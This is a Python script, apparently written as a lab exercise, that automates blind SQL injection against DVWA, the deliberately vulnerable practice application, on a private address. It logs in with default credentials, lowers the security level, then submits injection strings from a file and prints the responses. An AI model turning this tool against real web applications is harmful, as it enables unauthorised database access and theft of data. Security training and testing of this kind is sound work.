# -*- coding: utf-8 -*-

import logging
from bs4 import BeautifulSoup
import sys
import os
import mechanize
from colorama import Fore, Style


if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(filename='logs/blind_sqlinjection.log', level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(name)s %(message)s')
logger = logging.getLogger(__name__)

RHOST = "192.168.0.50"


class SQLinjector:
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        # self.br.set_debug_http(True)
        # br.set_debug_redirects(True)
        # br.set_debug_responses(True)

    def login(self):
        try:
            self.br.open("http://" + RHOST)
            #self.br.open("http://" + RHOST + "/dvwa")
            self.br.select_form(nr=0)

            self.br.form['username'] = 'admin'
            self.br.form['password'] = 'password'
            self.br.submit()

            self.br.follow_link(url_regex=r'security.php')
            self.br.select_form(nr=0)  # selects the form
            self.br.form['security'] = ["low"]  # changes the security setting to low
            self.br.submit()

            print("-" * 55)
            print("- " + self.br.title())
            print("-" * 55 + "\n")

        except Exception as e:
            logger.error(e)
            print(e)

    def inject(self):
        try:
            self.passwords = open("blind.txt", 'r')  #
            for self.password in self.passwords:
                self.password = self.password.replace("\n", "")

                #self.br.follow_link(url_regex=r'sqli_blind')
                self.br.open("http://192.168.0.50/vulnerabilities/sqli_blind/")
                # Again printing the browser title to show where I am
                print("-" * 55)
                print("- " + self.br.title())
                print("-" * 55)

                self.br.select_form(nr=0)
                print("Current parameter:", self.password)
                self.br.form['id'] = self.password
                self.res = self.br.submit()
                self.content = self.res.read()
                print(self.content)
                self.soup = BeautifulSoup(self.content, "lxml")
                print(self.soup)
                self.err = self.soup.html.body.pre
                #print(self.err)
                # if self.err == None:
                if self.err == "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1":
                    print("WRONG PARAMETER", self.password)
                    pass
                elif self.err == None:
                    print("WRONG PARAMETER", self.password)
                    pass
                else:
                    self.msg = self.soup.html.body.pre
                    print(str(self.msg).replace("<pre>", "").replace("<br/>", "\n").replace("</pre>", ""))

        except mechanize.HTTPError as e:
            pass


        except Exception as e:
            pass
            #print(e)


def main():
    automate = SQLinjector()
    automate.login()
    automate.inject()


if __name__ == '__main__':
    main()
    #print(chr(100))
   # c = 'v'
   # print("The ASCII value of '" + c + "' is", ord(c))
